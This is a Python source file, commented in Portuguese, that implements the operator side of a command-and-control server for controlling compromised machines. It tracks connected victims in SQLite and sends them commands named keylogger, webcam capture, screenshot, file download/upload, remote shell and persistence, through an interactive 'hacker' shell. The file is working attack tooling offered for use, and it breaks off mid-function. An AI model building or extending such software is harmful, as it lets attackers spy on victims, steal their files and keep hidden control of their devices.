#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import socket
import threading
import json
import base64
import hashlib
import sqlite3
import select
import tempfile
import shutil
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax
from rich.style import Style
from rich.box import ROUNDED
from rich.layout import Layout
from rich.live import Live
from rich.markdown import Markdown

console = Console()

class C2Server:
    def __init__(self):
        self.banner = self._gerar_banner_c2()
        self.config = {
            'host': '0.0.0.0',
            'port': 8080,
            'max_clients': 100,
            'timeout': 30,
            'database_file': 'c2_server.db',
            'log_file': 'c2_activity.log',
            'password_hash': None,
            'auto_start': False,
            'encryption_key': self._generate_key(),
            'prompt_style': 'kali'
        }
        
        self.clients = {}  # ID -> Client info
        self.server_socket = None
        self.running = False
        self.db_conn = None
        self.command_results = {}  # Armazenar resultados de comandos
        
        # Comandos disponíveis
        self.commands = {
            'system_info': 'Obter informações do sistema',
            'screenshot': 'Capturar tela (se disponível)',
            'webcam': 'Capturar webcam',
            'keylogger': 'Iniciar/Parar keylogger',
            'download': 'Download de arquivo',
            'upload': 'Upload de arquivo',
            'shell': 'Shell remoto',
            'persistence': 'Estabelecer persistência',
            'kill': 'Terminar cliente',
            'custom': 'Comando personalizado'
        }
    
    def _generate_key(self):
        """Gera chave de criptografia"""
        return base64.urlsafe_b64encode(os.urandom(32))
    
    def _gerar_banner_c2(self) -> str:
        return """
[bold red]
╔═╗╔═╗  ╔═╗╔╦╗╔═╗╦═╗╔═╗╔═╗
║ ╦║╣   ║╣ ║║║╠═╣╠╦╝╠═╣║  
╚═╝╚═╝  ╚═╝╩ ╩╩ ╩╩╚═╩ ╩╚═╝
[/bold red]
[bold white on red]        SERVIDOR COMMAND & CONTROL - v4.0[/bold white on red]
[bold yellow]        Central de Comando Elite - Modo Kali[/bold yellow]
"""
    
    def _setup_database(self):
        """Configura o banco de dados SQLite"""
        try:
            self.db_conn = sqlite3.connect(self.config['database_file'], check_same_thread=False)
            cursor = self.db_conn.cursor()
            
            # Tabela de clientes
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS clients (
                    id TEXT PRIMARY KEY,
                    ip TEXT,
                    port INTEGER,
                    first_seen TEXT,
                    last_seen TEXT,
                    os TEXT,
                    username TEXT,
                    privileges TEXT,
                    status TEXT,
                    hostname TEXT
                )
            ''')
            
            # Tabela de comandos
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    command TEXT,
                    args TEXT,
                    timestamp TEXT,
                    status TEXT,
                    result TEXT,
                    FOREIGN KEY (client_id) REFERENCES clients (id)
                )
            ''')
            
            # Tabela de logs
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS activity_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    action TEXT,
                    timestamp TEXT,
                    details TEXT
                )
            ''')
            
            # Tabela de resultados
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS command_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    command_id INTEGER,
                    output TEXT,
                    timestamp TEXT,
                    FOREIGN KEY (client_id) REFERENCES clients (id),
                    FOREIGN KEY (command_id) REFERENCES commands (id)
                )
            ''')
            
            self.db_conn.commit()
            console.print("[green]✅ Banco de dados configurado[/green]")
            
        except Exception as e:
            console.print(f"[red]✗ Erro no banco de dados: {str(e)}[/red]")
            # Criar conexão básica se falhar
            self.db_conn = sqlite3.connect(':memory:', check_same_thread=False)
    
    def _log_activity(self, client_id: str, action: str, details: str = ""):
        """Registra atividade no log"""
        try:
            cursor = self.db_conn.cursor()
            cursor.execute(
                "INSERT INTO activity_logs (client_id, action, timestamp, details) VALUES (?, ?, ?, ?)",
                (client_id, action, datetime.now().isoformat(), details)
            )
            self.db_conn.commit()
            
            # Também loga no arquivo
            with open(self.config['log_file'], 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] {client_id} - {action}: {details}\n")
                
        except Exception as e:
            console.print(f"[red]✗ Erro no log: {str(e)}[/red]")
    
    def _generate_client_id(self, client_info: dict) -> str:
        """Gera um ID único para o cliente"""
        unique_str = f"{client_info['ip']}:{client_info['port']}:{time.time()}"
        return hashlib.md5(unique_str.encode()).hexdigest()[:8].upper()
    
    def mostrar_menu_principal(self):
        """Menu principal do C2"""
        while True:
            console.clear()
            console.print(self.banner)
            
            status = "[green]✅ ONLINE[/green]" if self.running else "[red]❌ OFFLINE[/red]"
            clients_count = len(self.clients)
            
            tabela = Table(
                title=f"[bold cyan]🖥️  MENU C2 SERVER {status}[/bold cyan]",
                show_header=True,
                header_style="bold magenta",
                box=ROUNDED
            )
            tabela.add_column("Opção", style="cyan", width=8)
            tabela.add_column("Função", style="green")
            tabela.add_column("Status", style="yellow")
            
            tabela.add_row("1", "Iniciar Servidor", "🚀 Iniciar C2")
            tabela.add_row("2", "Parar Servidor", "🛑 Parar C2")
            tabela.add_row("3", "Clientes Conectados", f"👥 {clients_count} clientes")
            tabela.add_row("4", "Gerenciar Clientes", "🎯 Comandos remotos")
            tabela.add_row("5", "Monitor em Tempo Real", "📊 Live monitoring")
            tabela.add_row("6", "Configurações", "⚙️ Configurar servidor")
            tabela.add_row("7", "Logs de Atividade", "📋 Histórico")
            tabela.add_row("8", "Banco de Dados", "🗄️ Gerenciar dados")
            tabela.add_row("9", "Shell Interativo", "💻 Terminal remoto")
            tabela.add_row("0", "Sair", "🚪 Fechar C2")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=[str(i) for i in range(0, 10)],
                show_choices=False
            )
            
            if escolha == "1":
                self._iniciar_servidor()
            elif escolha == "2":
                self._parar_servidor()
            elif escolha == "3":
                self._listar_clientes()
            elif escolha == "4":
                self._gerenciar_clientes()
            elif escolha == "5":
                self._monitor_tempo_real()
            elif escolha == "6":
                self._menu_configuracao()
            elif escolha == "7":
                self._ver_logs()
            elif escolha == "8":
                self._gerenciar_banco_dados()
            elif escolha == "9":
                self._shell_interativo()
            elif escolha == "0":
                self._sair()
    
    def _iniciar_servidor(self):
        """Inicia o servidor C2"""
        if self.running:
            console.print("[yellow]⚠️ Servidor já está em execução[/yellow]")
            time.sleep(1)
            return
        
        console.print(Panel.fit(
            "[bold green]🚀 INICIANDO SERVIDOR C2[/bold green]",
            border_style="green"
        ))
        
        # Configuração do banco de dados
        self._setup_database()
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.config['host'], self.config['port']))
            self.server_socket.listen(self.config['max_clients'])
            self.server_socket.settimeout(1)
            
            self.running = True
            console.print(f"[green]✅ Servidor iniciado em {self.config['host']}:{self.config['port']}[/green]")
            
            # Thread para aceitar conexões
            accept_thread = threading.Thread(target=self._accept_connections, daemon=True)
            accept_thread.start()
            
            console.print("[yellow]🔄 Aguardando conexões de clientes...[/yellow]")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao iniciar servidor: {str(e)}[/red]")
            self.running = False
        
        time.sleep(2)
    
    def _parar_servidor(self):
        """Para o servidor C2"""
        if not self.running:
            console.print("[yellow]⚠️ Servidor não está em execução[/yellow]")
            time.sleep(1)
            return
        
        console.print(Panel.fit(
            "[bold red]🛑 PARANDO SERVIDOR C2[/bold red]",
            border_style="red"
        ))
        
        self.running = False
        
        # Desconectar todos os clientes
        for client_id in list(self.clients.keys()):
            self._disconnect_client(client_id)
        
        if self.server_socket:
            self.server_socket.close()
        
        if self.db_conn:
            self.db_conn.close()
        
        console.print("[green]✅ Servidor parado com sucesso[/green]")
        time.sleep(1)
    
    def _accept_connections(self):
        """Aceita conexões de clientes em loop"""
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                client_socket.settimeout(self.config['timeout'])
                
                # Gerar ID único para o cliente
                client_info = {
                    'socket': client_socket,
                    'ip': client_address[0],
                    'port': client_address[1],
                    'connected_at': datetime.now(),
                    'last_activity': datetime.now(),
                    'hostname': 'unknown',
                    'username': 'unknown',
                    'os': 'unknown'
                }
                
                client_id = self._generate_client_id(client_info)
                self.clients[client_id] = client_info
                
                # Registrar no banco de dados
                self._register_client(client_id, client_info)
                
                console.print(f"[green]✅ Novo cliente conectado: {client_id}[/green]")
                console.print(f"   [cyan]IP:[/cyan] {client_address[0]}:{client_address[1]}")
                
                # Thread para lidar com o cliente
                client_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_id, client_socket),
                    daemon=True
                )
                client_thread.start()
                
            except socket.timeout:
                continue
            except OSError:
                # Socket fechado, sair do loop
                break
            except Exception as e:
                if self.running:
                    console.print(f"[red]✗ Erro ao aceitar conexão: {str(e)}[/red]")
    
    def _register_client(self, client_id: str, client_info: dict):
        """Registra cliente no banco de dados"""
        try:
            cursor = self.db_conn.cursor()
            cursor.execute(
                '''INSERT OR REPLACE INTO clients 
                (id, ip, port, first_seen, last_seen, status, hostname, username, os) 
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                (
                    client_id,
                    client_info['ip'],
                    client_info['port'],
                    client_info['connected_at'].isoformat(),
                    client_info['last_activity'].isoformat(),
                    'connected',
                    client_info.get('hostname', 'unknown'),
                    client_info.get('username', 'unknown'),
                    client_info.get('os', 'unknown')
                )
            )
            self.db_conn.commit()
            self._log_activity(client_id, "CLIENT_CONNECTED", f"IP: {client_info['ip']}:{client_info['port']}")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao registrar cliente: {str(e)}[/red]")
    
    def _handle_client(self, client_id: str, client_socket: socket.socket):
        """Lida com comunicação do cliente"""
        try:
            while self.running and client_id in self.clients:
                try:
                    # Verificar se há dados disponíveis
                    ready = select.select([client_socket], [], [], 1)
                    if not ready[0]:
                        continue
                    
                    # Receber dados do cliente
                    data = client_socket.recv(65536)  # Aumentar buffer
                    if not data:
                        break
                    
                    # Processar mensagem
                    message = self._decrypt_data(data)
                    self._process_client_message(client_id, message)
                    
                    # Atualizar última atividade
                    self.clients[client_id]['last_activity'] = datetime.now()
                    
                except socket.timeout:
                    continue
                except ConnectionResetError:
                    break
                except Exception as e:
                    console.print(f"[red]✗ Erro com cliente {client_id}: {str(e)}[/red]")
                    break
        
        finally:
            self._disconnect_client(client_id)
    
    def _process_client_message(self, client_id: str, message: str):
        """Processa mensagem do cliente"""
        try:
            data = json.loads(message)
            message_type = data.get('type', 'unknown')
            
            if message_type == 'heartbeat':
                self._update_client_status(client_id, 'active')
                
            elif message_type == 'system_info':
                self._update_client_info(client_id, data.get('data', {}))
                
            elif message_type == 'command_result':
                self._process_command_result(client_id, data)
                
            elif message_type == 'file_upload':
                self._receive_file(client_id, data)
                
            else:
                console.print(f"[yellow]⚠️ Mensagem desconhecida de {client_id}: {message_type}[/yellow]")
                
        except json.JSONDecodeError:
            console.print(f"[red]✗ Mensagem inválida de {client_id}[/red]")
        except Exception as e:
            console.print(f"[red]✗ Erro ao processar mensagem: {str(e)}[/red]")
    
    def _update_client_info(self, client_id: str, info: dict):
        """Atualiza informações do cliente"""
        if client_id in self.clients:
            self.clients[client_id].update(info)
            
            try:
                cursor = self.db_conn.cursor()
                cursor.execute(
                    '''UPDATE clients SET hostname = ?, username = ?, os = ?, last_seen = ? 
                    WHERE id = ?''',
                    (
                        info.get('hostname', 'unknown'),
                        info.get('username', 'unknown'),
                        info.get('os', 'unknown'),
                        datetime.now().isoformat(),
                        client_id
                    )
                )
                self.db_conn.commit()
            except Exception as e:
                console.print(f"[red]✗ Erro ao atualizar info cliente: {str(e)}[/red]")
    
    def _process_command_result(self, client_id: str, data: dict):
        """Processa resultado de comando"""
        try:
            command_id = data.get('command_id')
            output = data.get('output', '')
            status = data.get('status', 'completed')
            
            # Armazenar resultado
            self.command_results[command_id] = output
            
            # Atualizar banco de dados
            cursor = self.db_conn.cursor()
            cursor.execute(
                "UPDATE commands SET status = ?, result = ? WHERE id = ?",
                (status, output, command_id)
            )
            self.db_conn.commit()
            
            self._log_activity(client_id, "COMMAND_RESULT", f"Comando {command_id}: {status}")
            
            # Mostrar resultado se for curto
            if len(output) < 500:
                console.print(Panel.fit(
                    f"[green]📋 Resultado do comando {command_id}:[/green]\n{output}",
                    border_style="green"
                ))
            else:
                console.print(f"[green]✅ Resultado do comando {command_id} recebido ({len(output)} caracteres)[/green]")
                
        except Exception as e:
            console.print(f"[red]✗ Erro ao processar resultado: {str(e)}[/red]")
    
    def _send_command(self, client_id: str, command: str, args: dict = None) -> int:
        """Envia comando para cliente e retorna ID do comando"""
        if client_id not in self.clients:
            console.print(f"[red]✗ Cliente {client_id} não encontrado[/red]")
            return -1
        
        try:
            # Registrar comando no banco de dados primeiro
            cursor = self.db_conn.cursor()
            cursor.execute(
                "INSERT INTO commands (client_id, command, args, timestamp, status) VALUES (?, ?, ?, ?, ?)",
                (client_id, command, json.dumps(args or {}), datetime.now().isoformat(), 'sent')
            )
            command_id = cursor.lastrowid
            self.db_conn.commit()
            
            # Preparar mensagem
            message = {
                'type': 'command',
                'command_id': command_id,
                'command': command,
                'args': args or {},
                'timestamp': datetime.now().isoformat()
            }
            
            encrypted = self._encrypt_data(json.dumps(message))
            self.clients[client_id]['socket'].sendall(encrypted)
            
            self._log_activity(client_id, "COMMAND_SENT", f"{command} - {args}")
            
            console.print(f"[green]✅ Comando '{command}' enviado para {client_id} (ID: {command_id})[/green]")
            return command_id
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao enviar comando: {str(e)}[/red]")
            return -1
    
    def _listar_clientes(self):
        """Lista clientes conectados"""
        console.clear()
        console.print(Panel.fit(
            "[bold blue]👥 CLIENTES CONECTADOS[/bold blue]",
            border_style="blue"
        ))
        
        if not self.clients:
            console.print("[yellow]⚠️ Nenhum cliente conectado[/yellow]")
            time.sleep(1)
            return
        
        tabela = Table(
            show_header=True,
            header_style="bold magenta",
            box=ROUNDED
        )
        tabela.add_column("ID", style="cyan", width=10)
        tabela.add_column("IP:Porta", style="green")
        tabela.add_column("Hostname", style="yellow")
        tabela.add_column("Usuário", style="white")
        tabela.add_column("Sistema", style="blue")
        tabela.add_column("Status", style="red")
        
        for client_id, info in self.clients.items():
            inactivity = (datetime.now() - info['last_activity']).seconds
            status_icon = "✅" if inactivity < 10 else "⏰" if inactivity < 30 else "❌"
            status_color = "green" if inactivity < 10 else "yellow" if inactivity < 30 else "red"
            
            tabela.add_row(
                client_id,
                f"{info['ip']}:{info['port']}",
                info.get('hostname', 'unknown'),
                info.get('username', 'unknown'),
                info.get('os', 'unknown'),
                f"[{status_color}]{status_icon} {inactivity}s[/{status_color}]"
            )
        
        console.print(tabela)
        input("\nPressione Enter para continuar...")
    
    def _gerenciar_clientes(self):
        """Menu de gerenciamento de clientes"""
        if not self.clients:
            console.print("[yellow]⚠️ Nenhum cliente conectado[/yellow]")
            time.sleep(1)
            return
        
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold green]🎯 GERENCIAR CLIENTES[/bold green]",
                border_style="green"
            ))
            
            # Listar clientes
            tabela = Table(show_header=True, header_style="bold cyan", box=ROUNDED)
            tabela.add_column("#", style="yellow", width=3)
            tabela.add_column("ID", style="cyan")
            tabela.add_column("IP", style="green")
            tabela.add_column("Hostname", style="white")
            tabela.add_column("Status", style="red")
            
            client_list = list(self.clients.keys())
            for i, client_id in enumerate(client_list, 1):
                info = self.clients[client_id]
                inactivity = (datetime.now() - info['last_activity']).seconds
                status = "[green]✅[/green]" if inactivity < 10 else "[yellow]⏰[/yellow]" if inactivity < 30 else "[red]❌[/red]"
                tabela.add_row(str(i), client_id, info['ip'], info.get('hostname', 'unknown'), status)
            
            tabela.add_row("0", "Voltar", "", "", "↩️")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione um cliente",
                choices=[str(i) for i in range(0, len(client_list) + 1)],
                show_choices=False
            )
            
            if escolha == "0":
                return
            
            client_id = client_list[int(escolha) - 1]
            self._menu_comandos_cliente(client_id)
    
    def _menu_comandos_cliente(self, client_id: str):
        """Menu de comandos para cliente específico"""
        while True:
            console.clear()
            info = self.clients[client_id]
            
            console.print(Panel.fit(
                f"[bold cyan]⚡ CLIENTE: [green]{info.get('hostname', 'unknown')}[/green] (@[yellow]{info.get('username', 'unknown')}[/yellow])[/bold cyan]",
                border_style="cyan"
            ))
            
            console.print(f"[green]IP:[/green] {info['ip']}:{info['port']}")
            console.print(f"[green]Sistema:[/green] {info.get('os', 'unknown')}")
            console.print(f"[green]Conectado:[/green] {info['connected_at'].strftime('%Y-%m-%d %H:%M:%S')}")
            console.print(f"[green]Última atividade:[/green] {info['last_activity'].strftime('%H:%M:%S')}")
            
            tabela = Table(show_header=True, header_style="bold magenta", box=ROUNDED)
            tabela.add_column("Comando", style="cyan")
            tabela.add_column("Descrição", style="green")
            
            for cmd, desc in self.commands.items():
                tabela.add_row(cmd, desc)
            
            tabela.add_row("results", "Ver resultados de comandos")
            tabela.add_row("back", "Voltar ao menu anterior")
            console.print(tabela)
            
            comando = Prompt.ask(
                f"[blink yellow]➤[/blink yellow] [red]hacker[/red]@[green]{info['ip']}[/green]$ ",
                default="back"
            )
            
            if comando.lower() == 'back':
                return
            elif comando.lower() == 'results':
                self._ver_resultados_comandos(client_id)
            elif comando in self.commands:
                self._executar_comando(client_id, comando)
            else:
                console.print("[red]✗ Comando não reconhecido[/red]")
                time.sleep(1)
    
    def _executar_comando(self, client_id: str, comando: str):
        """Executa comando no cliente"""
        args = {}
        
        if comando == 'download':
            args['file_path'] = Prompt.ask("[yellow]?[/yellow] Caminho do arquivo para download")
        
        elif comando == 'upload':
            args['file_path'] = Prompt.ask("[yellow]?[/yellow] Caminho do arquivo para upload")
            args['destination'] = Prompt.ask("[yellow]?[/yellow] Destino no cliente")
        
        elif comando == 'shell' or comando == 'custom':
            comando_shell = Prompt.ask("[yellow]?[/yellow] Comando para executar")
            args['command'] = comando_shell
            # Para comandos customizados, usar shell como tipo
            if comando == 'custom':
                comando = 'shell'
        
        command_id = self._send_command(client_id, comando, args)
        
        if command_id == -1:
            console.print(f"[red]✗ Falha ao enviar comando[/red]")
        
        time.sleep(1)
    
    def _ver_resultados_comandos(self, client_id: str):
        """Mostra resultados de comandos para um cliente"""
        try:
            cursor = self.db_conn.cursor()
            cursor.execute(
                "SELECT id, command, args, timestamp, status, result FROM commands WHERE client_id = ? ORDER BY id DESC LIMIT 10",
                (client_id,)
            )
            
            comandos = cursor.fetchall()
            
            if not comandos:
                console.print("[yellow]⚠️ Nenhum comando executado para este cliente[/yellow]")
                time.sleep(1)
                return
            
            console.print(Panel.fit(
                "[bold blue]📋 ÚLTIMOS COMANDOS EXECUTADOS[/bold blue]",
                border_style="blue"
            ))
            
            for cmd_id, command, args_str, timestamp, status, result in comandos:
                args = json.loads(args_str) if args_str else {}
                
                status_color = "green" if status == "completed" else "yellow" if status == "sent" else "red"
                
                console.print(f"[cyan]ID: {cmd_id}[/cyan] - [bold]{command}[/bold] - [{status_color}]{status}[/{status_color}]")
                console.print(f"   [yellow]Args:[/yellow] {args}")
                console.print(f"   [yellow]Time:[/yellow] {timestamp}")
                
                if result and len(result) < 1000:
                    console.print(f"   [green]Resultado:[/green]")
                    console.print(Syntax(result, "text", word_wrap=True))
                elif result:
                    console.print(f"   [green]Resultado:[/green] {len(result)} caracteres (use 'view result_id' para ver)")
                
                console.print("")
            
            # Opção para ver resultado específico
            cmd_id = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Digite ID para ver resultado ou 'back'",
                default="back"
            )
            
            if cmd_id.lower() != 'back':
                try:
                    cmd_id_int = int(cmd_id)
                    cursor.execute(
                        "SELECT result FROM commands WHERE id = ? AND client_id = ?",
                        (cmd_id_int, client_id)
                    )
                    resultado = cursor.fetchone()
                    
                    if resultado and resultado[0]:
                        console.print(Panel.fit(
                            Syntax(resultado[0], "text", word_wrap=True),
                            title=f"[bold green]RESULTADO DO COMANDO {cmd_id_int}[/bold green]",
                            border_style="green"
                        ))
                    else:
                        console.print("[yellow]⚠️ Resultado não encontrado ou vazio[/yellow]")
                    
                    input("\nPressione Enter para continuar...")
                    
                except ValueError:
                    console.print("[red]✗ ID inválido[/red]")
                    time.sleep(1)
                    
        except Exception as e:
            console.print(f"[red]✗ Erro ao buscar comandos: {str(e)}[/red]")
            time.sleep(1)
    
    def _shell_interativo(self):
        """Shell interativo estilo Kali"""
        if not self.clients:
            console.print("[yellow]⚠️ Nenhum cliente conectado[/yellow]")
            time.sleep(1)
            return
        
        console.clear()
        console.print(Panel.fit(
            "[bold red]💻 SHELL INTERATIVO - MODO KALI[/bold red]",
            border_style="red"
        ))
        
        # Selecionar cliente
        client_list = list(self.clients.keys())
        if len(client_list) == 1:
            client_id = client_list[0]
        else:
            for i, cid in enumerate(client_list, 1):
                info = self.clients[cid]
                console.print(f"{i}. {cid} - {info['ip']} ({info.get('hostname', 'unknown')})")
            
            escolha = IntPrompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione o cliente",
                default=1,
                show_default=True
            )
            client_id = client_list[escolha - 1]
        
        info = self.clients[client_id]
        
        console.print(Panel.fit(
            f"[bold green]Conectado a: [yellow]{info.get('hostname', 'unknown')}[/yellow] (@[cyan]{info.get('username', 'unknown')}[/cyan])[/bold green]",
            border_style="green"
        ))
        console.print("[yellow]Digite 'exit' para sair do shell[/yellow]")
        console.print("[yellow]Digite 'background' para executar em segundo plano[/yellow]")
        
        while True:
            try:
                # Prompt estilo Kali
                prompt_text = f"[bold red]hacker[/bold red]@[green]{info['ip']}[/green]:[blue]{info.get('hostname', 'unknown')}[/blue]$ "
                comando = console.input(prompt_text).strip()
                
                if not comando:
                    continue
                
                if comando.lower() == 'exit':
                    break
                
                if comando.lower() == 'background':
                    console.print("[yellow]Modo background ativado. Comandos serão executados em segundo plano.[/yellow]")
                    background = True
                    continue
                
                # Enviar comando
                command_id = self._send_command(client_id, 'shell', {'command': comando})
                
                if command_id == -1:
                    console.print("[red]✗ Erro ao enviar comando[/red]")
                    continue
                
                # Aguardar resultado se não for background
                if not getattr(self, 'background', False):
                    console.print("[yellow]🔄 Aguardando resultado... (Ctrl+C para cancelar)[/yellow]")
                    
                    # Aguardar alguns segundos pelo resultado
                    start_time = time.time()
                    while time.time() - start_time < 30:  # Timeout de 30 segundos
                        if command_id in self.command_results:
                            resultado = self.command_results.pop(command_id)
                            console.print(Panel.fit(
                                Syntax(resultado, "text", word_wrap=True),
                                title=f"[bold green]RESULTADO[/bold green]",
                                border_style="green"
                            ))
                            break
                        time.sleep(1)
                    else:
                        console.print("[yellow]⏰ Timeout aguardando resultado[/yellow]")
                
            except KeyboardInterrupt:
                console.print("\n[yellow]⚠️ Comando cancelado[/yellow]")
                continue
            except Exception as e:
                console.print(f"[red]✗ Erro: {str(e)}[/red]")
                break
    
    def _menu_configuracao(self):
        """Menu de configuração do servidor"""
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]⚙️ CONFIGURAÇÕES DO SERVIDOR[/bold cyan]",
                border_style="cyan"
            ))
            
            tabela = Table(show_header=False, box=ROUNDED)
            tabela.add_row("1", f"Host: {self.config['host']}")
            tabela.add_row("2", f"Porta: {self.config['port']}")
            tabela.add_row("3", f"Máx. Clientes: {self.config['max_clients']}")
            tabela.add_row("4", f"Timeout: {self.config['timeout']}s")
            tabela.add_row("5", f"Arquivo DB: {self.config['database_file']}")
            tabela.add_row("6", f"Arquivo Log: {self.config['log_file']}")
            tabela.add_row("7", f"Auto Iniciar: {'✅' if self.config['auto_start'] else '❌'}")
            tabela.add_row("8", f"Prompt Style: {self.config['prompt_style']}")
            tabela.add_row("0", "Voltar")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione para alterar",
                choices=[str(i) for i in range(0, 9)],
                show_choices=False
            )
            
            if escolha == "1":
                self.config['host'] = Prompt.ask(
                    "[yellow]?[/yellow] Digite o host",
                    default=self.config['host']
                )
            elif escolha == "2":
                self.config['port'] = IntPrompt.ask(
                    "[yellow]?[/yellow] Digite a porta",
                    default=self.config['port']
                )
            elif escolha == "3":
                self.config['max_clients'] = IntPrompt.ask(
                    "[yellow]?[/yellow] Máximo de clientes",
                    default=self.config['max_clients']
                )
            elif escolha == "4":
                self.config['timeout'] = IntPrompt.ask(
                    "[yellow]?[/yellow] Timeout (segundos)",
                    default=self.config['timeout']
                )
            elif escolha == "5":
                self.config['database_file'] = Prompt.ask(
                    "[yellow]?[/yellow] Arquivo de banco de dados",
                    default=self.config['database_file']
                )
            elif escolha == "6":
                self.config['log_file'] = Prompt.ask(
                    "[yellow]?[/yellow] Arquivo de log",
                    default=self.config['log_file']
                )
            elif escolha == "7":
                self.config['auto_start'] = Confirm.ask(
                    "[yellow]?[/yellow] Auto iniciar servidor",
                    default=self.config['auto_start']
                )
            elif escolha == "8":
                self.config['prompt_style'] = Prompt.ask(
                    "[yellow]?[/yellow] Estilo do prompt (kali/hacker/default)",
                    default=self.config['prompt_style'],
                    choices=["kali", "hacker", "default"]
                )
            elif escolha == "0":
                return
    
    def _monitor_tempo_real(self):
        """Monitor em tempo real das conexões"""
        if not self.clients:
            console.print("[yellow]⚠️ Nenhum cliente conectado[/yellow]")
            time.sleep(1)
            return
        
        console.clear()
        console.print(Panel.fit(
            "[bold green]📊 MONITOR EM TEMPO REAL[/bold green]",
            border_style="green"
        ))
        console.print("[yellow]Pressione Ctrl+C para voltar[/yellow]")
        
        try:
            with Live(refresh_per_second=2) as live:
                while True:
                    layout = Layout()
                    
                    # Header
                    header = Panel.fit(
                        f"[bold]C2 SERVER - Clientes Conectados: {len(self.clients)}[/bold]",
                        style="blue"
                    )
                    layout.split_column(header, Layout(name="main"))
                    
                    # Tabela de clientes
                    tabela = Table(show_header=True, header_style="bold magenta", box=ROUNDED)
                    tabela.add_column("ID", style="cyan", width=10)
                    tabela.add_column("IP", style="green")
                    tabela.add_column("Hostname", style="yellow")
                    tabela.add_column("Atividade", style="white")
                    tabela.add_column("Status", style="red")
                    
                    for client_id, info in self.clients.items():
                        inactivity = (datetime.now() - info['last_activity']).seconds
                        status_color = "green" if inactivity < 10 else "yellow" if inactivity < 30 else "red"
                        status_icon = "✅" if inactivity < 10 else "⏰" if inactivity < 30 else "❌"
                        
                        tabela.add_row(
                            client_id,
                            info['ip'],
                            info.get('hostname', 'unknown'),
                            f"{inactivity}s",
                            f"[{status_color}]{status_icon}[/{status_color}]"
                        )
                    
                    layout["main"].update(tabela)
                    live.update(layout)
                    time.sleep(2)
                    
        except KeyboardInterrupt:
            pass
    
    def _ver_logs(self):
        """Exibe logs de atividade"""
        try:
            if not os.path.exists(self.config['log_file']):
                console.print("[yellow]⚠️ Nenhum log encontrado[/yellow]")
                time.sleep(1)
                return
            
            with open(self.config['log_file'], 'r', encoding='utf-8') as f:
                logs = f.readlines()[-20:]  # Últimas 20 linhas
            
            console.print(Panel.fit(
                "[bold blue]📋 ÚLTIMOS LOGS[/bold blue]",
                border_style="blue"
            ))
            
            for log in logs:
                if "CLIENT_CONNECTED" in log:
                    style = "green"
                elif "CLIENT_DISCONNECTED" in log:
                    style = "yellow"
                elif "COMMAND_SENT" in log:
                    style = "cyan"
                elif "COMMAND_RESULT" in log:
                    style = "blue"
                else:
                    style = "white"
                
                console.print(f"[{style}]{log.strip()}[/{style}]")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao ler logs: {str(e)}[/red]")
        
        input("\nPressione Enter para continuar...")
    
    def _gerenciar_banco_dados(self):
        """Menu de gerenciamento do banco de dados"""
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold magenta]🗄️ GERENCIAR BANCO DE DADOS[/bold magenta]",
                border_style="magenta"
            ))
            
            tabela = Table(show_header=False, box=ROUNDED)
            tabela.add_row("1", "Estatísticas do BD")
            tabela.add_row("2", "Exportar Dados")
            tabela.add_row("3", "Limpar Dados Antigos")
            tabela.add_row("4", "Otimizar BD")
            tabela.add_row("0", "Voltar")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=["0", "1", "2", "3", "4"],
                show_choices=False
            )
            
            if escolha == "1":
                self._mostrar_estatisticas_bd()
            elif escolha == "2":
                self._exportar_dados()
            elif escolha == "3":
                self._limpar_dados_antigos()
            elif escolha == "4":
                self._otimizar_bd()
            elif escolha == "0":
                return
    
    def _mostrar_estatisticas_bd(self):
        """Mostra estatísticas do banco de dados"""
        try:
            cursor = self.db_conn.cursor()
            
            # Estatísticas de clientes
            cursor.execute("SELECT COUNT(*) FROM clients")
            total_clients = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM clients WHERE status = 'connected'")
            connected_clients = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM commands")
            total_commands = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM activity_logs")
            total_logs = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM command_results")
            total_results = cursor.fetchone()[0]
            
            # Tamanho do arquivo
            db_size = os.path.getsize(self.config['database_file']) if os.path.exists(self.config['database_file']) else 0
            db_size_mb = db_size / (1024 * 1024)
            
            console.print(Panel.fit(
                f"""[bold]ESTATÍSTICAS DO BANCO DE DADOS:[/bold]
[cyan]Total de Clientes:[/cyan] {total_clients}
